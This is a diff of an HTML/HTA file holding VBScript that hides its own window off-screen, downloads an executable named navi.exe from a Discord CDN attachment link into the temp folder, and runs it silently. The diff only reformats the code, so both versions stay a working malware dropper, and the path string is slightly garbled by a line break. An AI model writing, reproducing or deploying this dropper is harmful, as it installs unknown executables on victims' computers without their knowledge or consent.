@@ -1,28 +1,24 @@
-<html>
-<body>
-<script language="VBScript">
+<html><body><script language="VBScript">
 Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
-Dim shell, fso, temp, url, dest
-Set shell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-temp = fso.GetSpecialFolder(2)
-url = "https://cdn.discordapp.com/attachments/1517616291660300400/1521278749776023673/navi.exe?ex=6a4440bd&is=6a42ef3d&hm=bd0e7a03d7afea582e8c201c7e0cb4fb2c73f365615893bfbed529c5a777c5df&"
-dest = temp & "
+Dim shell,fso,temp,url,dest,http,stream
+Set shell=CreateObject("WScript.Shell")
+Set fso=CreateObject("Scripting.FileSystemObject")
+temp=fso.GetSpecialFolder(2)
+url="https://cdn.discordapp.com/attachments/1517616291660300400/1521278749776023673/navi.exe?ex=6a4440bd&is=6a42ef3d&hm=bd0e7a03d7afea582e8c201c7e0cb4fb2c73f365615893bfbed529c5a777c5df&"
+dest=temp & "
 avi.exe"
 
-Dim http: Set http = CreateObject("MSXML2.XMLHTTP")
-http.Open "GET", url, False
+Set http=CreateObject("MSXML2.XMLHTTP")
+http.Open "GET",url,False
 http.Send
-If http.Status = 200 Then
-    Dim stream: Set stream = CreateObject("ADODB.Stream")
+If http.Status=200 Then
+    Set stream=CreateObject("ADODB.Stream")
     stream.Open
-    stream.Type = 1
+    stream.Type=1
     stream.Write http.ResponseBody
-    stream.SaveToFile dest, 2
+    stream.SaveToFile dest,2
     stream.Close
-    shell.Run """" & dest & """", 0, False
+    shell.Run """" & dest & """",0,False
 End If
 window.close()
-</script>
-</body>
-</html>
+</script></body></html>
